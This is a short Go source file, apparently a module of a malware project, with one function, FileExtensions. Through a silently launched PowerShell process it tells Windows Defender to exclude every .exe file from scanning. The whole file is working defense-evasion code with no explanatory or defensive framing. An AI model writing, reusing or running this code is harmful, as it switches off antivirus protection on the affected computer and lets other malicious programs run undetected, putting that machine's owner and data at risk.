package Exclude

import (
	"syscall"
	"unsafe"
)

func FileExtensions() {
	wdsmd := `powershell -Command "Set-MpPreference -ExclusionExtension *.exe -Force"`
	line, _ := syscall.UTF16PtrFromString(wdsmd)

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	syscall.CreateProcess(nil, line, nil, nil, false, 0, nil, nil, &si, &pi)
	syscall.WaitForSingleObject(pi.Process, syscall.INFINITE)
	syscall.CloseHandle(pi.Process)
	syscall.CloseHandle(pi.Thread)
}
